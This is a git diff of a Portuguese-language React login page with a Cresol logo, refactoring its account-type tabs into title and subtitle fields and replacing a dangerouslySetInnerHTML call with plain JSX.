@@ -1,15 +1,17 @@
-import React, { useState, useEffect } from "react";
+
+import React, { useState } from "react";
 import { Eye, EyeOff, HelpCircle } from "lucide-react";
 import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";
 import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
 import { LocationPermissionPrompt } from "@/components/LocationPermissionPrompt";
 import { VirtualKeyboardInline } from "@/components/VirtualKeyboardInline";
-import { Switch } from "@/components/ui/switch"; // novo
+import { Switch } from "@/components/ui/switch";
 
+// Atualize aqui: Use título e subtítulo (duas linhas) como campos explícitos!
 const TABS = [
-  { label: <>Pessoa<br/>Física</>, value: "fisica" },
-  { label: <>Pessoa<br/>Jurídica</>, value: "juridica" },
-  { label: <>Gerenciador<br/>Financeiro</>, value: "financeiro" },
+  { title: "Pessoa", subtitle: "Física", value: "fisica" },
+  { title: "Pessoa", subtitle: "Jurídica", value: "juridica" },
+  { title: "Gerenciador", subtitle: "Financeiro", value: "financeiro" },
 ];
 
 const Index = () => {
@@ -34,13 +36,11 @@ const Index = () => {
   const [showPasswordKeyboard, setShowPasswordKeyboard] = useState(false);
   const [senhaTemp, setSenhaTemp] = useState("");
 
-  // Ao focar no input de senha, mostra teclado e preenche senhaTemp
   function handlePasswordInputFocus() {
     setSenhaTemp(senha);
     setShowPasswordKeyboard(true);
   }
 
-  // Envia senha do teclado pro estado principal e fecha teclado
   function handleKeyboardSubmit(val: string) {
     setSenha(val);
     setShowPasswordKeyboard(false);
@@ -173,8 +173,8 @@ const Index = () => {
     }
   };
 
-  // Supondo que o header/flutuante da sua aplicação tenha cerca de 52px de altura (ajuste conforme necessário)
-  const locationPromptOffset = 54; // Por ex., 48~56px, altere conforme a altura real do topo
+  // Supondo que o header/flutuante da sua aplicação tenha cerca de 54px de altura (ajuste conforme necessário)
+  const locationPromptOffset = 54;
 
   return (
     <div className="min-h-screen flex bg-[#fff]">
@@ -183,7 +183,7 @@ const Index = () => {
         onAccept={handleAcceptLocation}
         onAllowOnce={handleAllowOnce}
         onNeverAllow={handleNeverAllow}
-        topOffset={locationPromptOffset} // <- Posição dinâmica abaixo do header/flutuante
+        topOffset={locationPromptOffset}
       />
       {/* Left: Formulário */}
       <div className="w-1/2 flex flex-col justify-center px-[7%] py-12 relative">
@@ -202,23 +202,24 @@ const Index = () => {
             {TABS.map((t, idx) => (
               <button
                 key={t.value}
-                className={`pb-0.5 pt-1.5 text-[1.13rem] leading-snug font-semibold transition-colors text-[#145C36] flex flex-col items-start
+                className={`pb-0.5 pt-1.5 text-[1.13rem] leading-snug font-semibold transition-colors text-[#145C36]
+                  flex flex-col items-center
                   ${tab === t.value ? "border-b-2 border-orange-500" : "border-b-2 border-transparent"}
                 `}
                 style={{
                   minHeight: "43px",
-                  whiteSpace: "pre-line"
                 }}
                 onClick={() => setTab(t.value)}
-                dangerouslySetInnerHTML={{ __html: t.label.props.children.join("<br/>") }} // ajuste para inserir br
-              />
+              >
+                <span>{t.title}</span>
+                <span>{t.subtitle}</span>
+              </button>
             ))}
           </div>
           {/* Login Form */}
           <form className="mt-6">
             {renderFormContent()}
 
-            {/* Entrar */}
             <button
               type="submit"
               className="w-full h-11 rounded bg-orange-500 hover:bg-orange-600 transition font-bold text-white text-lg shadow"
@@ -241,7 +242,6 @@ const Index = () => {
             </div>
           )}
 
-          {/* Primeiro acesso - abas física e jurídica */}
           {(tab === "fisica" || tab === "juridica") && (
             <div className="mt-10 border-t border-gray-100 pt-8">
               <h2 className="text-lg font-semibold mb-2 text-[#145C36]">Primeiro acesso</h2>
@@ -274,3 +274,4 @@ const Index = () => {
 };
 
 export default Index;
+
